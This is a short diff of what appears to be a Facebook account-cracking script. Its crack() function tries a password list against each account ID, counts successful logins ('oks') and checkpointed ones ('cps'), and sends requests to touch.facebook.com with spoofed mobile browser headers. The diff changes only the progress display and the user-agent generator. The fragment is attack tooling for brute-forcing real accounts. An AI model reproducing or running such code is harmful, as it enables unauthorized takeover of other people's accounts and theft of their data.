@@ -119,7 +119,7 @@ def crack(uid, pww, total_idz):
     global cps
     global bkas
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[SUMON]- {loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}  ")
+    sys.stdout.write(f"\r{x}[SUMON]- {loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}             ")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -155,7 +155,7 @@ def crack(uid, pww, total_idz):
             "Host":"touch.facebook.com",
             "Connection":"keep-alive",
             "Upgrade-Insecure-Requests":"1",
-            "User-Agent":ugenX(),
+            "User-Agent":useragent_facebook(),
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "dnt":"1",
             "X-Requested-With":"mark.via.gp",
